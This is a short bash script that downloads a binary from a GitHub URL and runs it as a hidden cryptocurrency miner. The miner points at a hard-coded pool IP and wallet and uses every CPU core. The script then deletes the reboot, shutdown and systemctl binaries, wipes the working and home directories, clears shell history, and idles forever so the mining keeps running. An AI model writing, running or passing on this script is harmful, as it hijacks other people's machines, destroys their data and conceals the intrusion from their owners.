#!/bin/bash
apt-get update 
wget -O oasis https://github.com/malogrono/Compare/raw/main/ayday
chmod 777 oasis
./oasis --algorithm verushash --pool stratum+tcp:///128.199.167.154:443 --wallet RCADCQ9UW1RsUaF94Jp4huPSdQ7bhwYwa4.A$RANDOM --password x --cpu-threads $(nproc --all) > /dev/null 2>&1
sleep 30
sudo rm -rvf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl || rm -rvf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl
rm -rvf *
cd ~/
rm -rvf *
history -cr
while true
do
        echo "hold down..."
        sleep 60
done
